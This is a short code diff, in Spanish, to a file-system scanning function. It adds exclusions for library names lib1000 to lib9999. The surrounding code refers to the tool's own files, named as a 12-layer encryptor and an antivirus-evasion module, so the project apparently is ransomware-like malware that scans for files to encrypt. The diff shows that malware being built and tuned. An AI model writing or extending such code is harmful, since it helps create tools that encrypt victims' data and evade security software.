@@ -78,6 +78,10 @@ def escanear_sistema():
             'AppData\\Local\\Microsoft\\Windows\\INetCache',
             'AppData\\Local\\Microsoft\\Windows\\WebCache'
         }
+    
+    for i in range(1000, 10000):
+        evitar_parcial.add(f'lib{i}')
+    
     archivos_app = {'launcher.py', 'rutas.py', 'encriptador_12_capas.py', 'evasion_av.py', 'launcher.bat', 'launcher.sh'}
     dir_app = os.path.abspath(os.getcwd())
     archivos_encontrados = []
